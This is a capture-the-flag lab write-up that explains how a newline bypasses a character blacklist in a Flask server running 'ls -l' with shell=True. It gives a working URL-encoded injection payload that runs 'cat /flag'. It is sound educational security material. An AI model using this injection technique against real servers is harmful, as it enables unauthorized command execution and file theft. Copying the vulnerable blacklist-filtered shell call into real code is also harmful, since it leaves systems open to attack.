# Command Injection 6

Like the previous challenge, we get a `/challenge/server` that runs a command using `subprocess.run()`. The server goes back to producing output
of the `command`, but the server tries escape alot more characters.

```python
def challenge():
    arg = (
        flask.request.args.get("root", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

It almost feels like we went back to the first couple command injection exercises, just with more character restrictions.

After thinking about it for a while, there is one character that isn't escaped: `\n`.

So, constructing the arg like so should make it run multiple commands, without having to use a `;`, or other methods of
trying to run multiple commands:

```bash
ls -l\n cat /flag
     ^ start of arg variable
```

That would make subprocess run the 2 commands, just like if we were to press enter after a command.

This is what the payload would look like:

```bash
curl "challenge.localhost:80/exercise?root=%0acat%20/flag"
```
`%0a` is the URI encoding for a newline.

The server's http response now has the output of `ls -l` and then the flag right after it!

